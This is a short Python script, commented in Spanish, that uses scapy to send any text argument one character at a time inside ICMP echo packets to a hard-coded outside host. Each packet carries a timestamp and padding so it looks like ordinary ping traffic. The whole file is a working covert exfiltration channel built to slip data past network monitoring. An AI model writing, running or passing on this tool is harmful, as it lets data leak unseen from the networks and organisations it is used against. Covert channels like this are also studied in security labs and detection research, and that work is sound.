from scapy.all import IP, ICMP, send
import time
import sys
import struct

# Configuración
DESTINO_IP = "8.8.8.8"   # IP destino
ID_ICMP = 12345          # ID fijo de ICMP
INTERVALO = 0.5          # segundos entre paquetes

def crear_payload(caracter):
    """
    Crear payload ICMP stealth:
    - 4 bytes de timestamp (Unix time)
    - 4 bytes de padding (cero)
    - 1 byte del caracter a enviar
    Total mínimo 9 bytes
    """
    timestamp = int(time.time())
    payload = struct.pack("!I", timestamp)  # 4 bytes timestamp
    payload += b'\x00'*4                     # 4 bytes padding
    payload += bytes(caracter, 'utf-8')      # caracter
    return payload

def enviar_paquete_icmp(caracter, destino_ip, seq):
    """
    Envía un paquete ICMP con payload stealth, manteniendo id y seq coherentes.
    """
    payload = crear_payload(caracter)
    paquete = IP(dst=destino_ip) / ICMP(id=ID_ICMP, seq=seq) / payload
    send(paquete, verbose=False)
    print(f"[OK] Enviado ICMP id={ID_ICMP} seq={seq} char={caracter!r}")

def enviar_texto_como_icmp(texto, destino_ip):
    """
    Envía cada carácter del texto como un paquete ICMP, manteniendo secuencia y timestamps.
    """
    seq = 0
    for caracter in texto:
        enviar_paquete_icmp(caracter, destino_ip, seq)
        seq += 1
        time.sleep(INTERVALO)

if __name__ == "__main__":
    if len(sys.argv) != 2:
        print("Uso: sudo python3 pingv4_stealth.py \"<texto_a_enviar>\"")
        sys.exit(1)

    texto = sys.argv[1]
    print(f"[*] Enviando texto como paquetes ICMP stealth hacia {DESTINO_IP} ...")
    enviar_texto_como_icmp(texto, DESTINO_IP)
    print("[*] Finalizado.")
